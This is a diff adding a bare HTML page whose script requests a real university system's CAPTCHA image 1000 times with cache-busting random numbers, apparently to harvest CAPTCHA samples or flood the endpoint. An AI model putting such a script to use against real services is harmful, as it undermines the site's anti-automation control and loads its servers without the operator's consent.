@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+</head>
+<body>
+<script>
+    for (var i=0;i<1000;i++) {
+        var image = document.createElement("img");
+        var randomNum = Math.random();
+        image.src="http://jwgls.jmu.edu.cn/Common/CheckCode.aspx?"+randomNum;
+        document.body.appendChild(image);
+    }
+</script>
+</body>
+</html>
